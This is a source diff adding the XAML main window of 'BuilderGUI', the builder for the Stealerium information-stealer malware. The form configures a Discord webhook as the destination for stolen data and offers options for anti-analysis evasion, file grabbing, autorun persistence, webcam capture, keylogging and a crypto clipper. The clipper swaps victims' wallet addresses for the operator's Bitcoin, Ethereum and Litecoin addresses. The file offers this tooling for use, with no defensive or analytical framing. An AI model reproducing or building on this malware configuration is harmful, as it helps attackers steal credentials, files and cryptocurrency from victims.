@@ -1,0 +1,58 @@
+﻿<Window x:Class="BuilderGUI.MainWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:local="clr-namespace:BuilderGUI"
+        Title="BuilderGUI" Height="600" Width="400">
+    <Grid Margin="10">
+        <StackPanel Orientation="Vertical">
+            <!-- Logo Image -->
+            <Image Source="Resources/STEALERIUM.jpg" Height="100" />
+
+            <!-- Stub Status Label -->
+            <TextBlock Name="StubStatusLabel" Text="" Foreground="Red" Margin="0,10,0,0" />
+
+            <!-- Discord Webhook URL -->
+            <TextBlock Text="Discord Webhook URL:" Margin="0,10,0,0"/>
+            <TextBox Name="WebhookUrlTextBox" Width="350" />
+
+            <!-- Test Webhook Button -->
+            <Button Name="TestWebhookButton" Content="Test Webhook" Width="100" Margin="0,5,0,0" Click="TestWebhookButton_Click" />
+
+            <!-- Webhook Status Label -->
+            <TextBlock Name="WebhookStatusLabel" Text="" Foreground="Green" Margin="0,5,0,0" />
+
+            <!-- Configuration Options -->
+            <CheckBox Name="DebugCheckBox" Content="Debug all exceptions to file?" Margin="0,10,0,0"/>
+            <CheckBox Name="AntiAnalysisCheckBox" Content="Use anti analysis?" />
+            <CheckBox Name="StartDelayCheckBox" Content="Use random start delay?" />
+
+            <!-- File Grabber -->
+            <CheckBox Name="GrabberCheckBox" Content="File Grabber ?" Margin="0,10,0,0"/>
+
+            <!-- Options Dependent on Startup -->
+            <CheckBox Name="StartupCheckBox" Content="Install autorun?" Checked="StartupCheckBox_Checked" Unchecked="StartupCheckBox_Unchecked"/>
+            <StackPanel Name="StartupOptionsPanel" Visibility="Collapsed">
+                <CheckBox Name="WebcamScreenshotCheckBox" Content="Create webcam screenshots?" Margin="0,10,0,0" />
+                <CheckBox Name="KeyloggerCheckBox" Content="Install keylogger?" />
+                <CheckBox Name="ClipperCheckBox" Content="Install clipper?" Checked="ClipperCheckBox_Checked" Unchecked="ClipperCheckBox_Unchecked" />
+            </StackPanel>
+
+            <!-- Clipper Addresses -->
+            <StackPanel Name="ClipperAddressesPanel" Visibility="Collapsed" Margin="0,10,0,0">
+                <TextBlock Text="Clipper Addresses:" FontWeight="Bold" />
+                <TextBlock Text="Your Bitcoin Address:" />
+                <TextBox Name="ClipperBTCTextBox" Width="350" />
+                <TextBlock Text="Your Ethereum Address:" />
+                <TextBox Name="ClipperETHTextBox" Width="350" />
+                <TextBlock Text="Your Litecoin Address:" />
+                <TextBox Name="ClipperLTCTextBox" Width="350" />
+            </StackPanel>
+
+            <!-- Build Button -->
+            <Button Name="BuildButton" Content="Build" Width="100" Margin="0,10,0,0" Click="BuildButton_Click" />
+
+            <!-- Build Status Label -->
+            <TextBlock Name="BuildStatusLabel" Text="" Foreground="Green" Margin="0,5,0,0" TextWrapping="Wrap" />
+        </StackPanel>
+    </Grid>
+</Window>
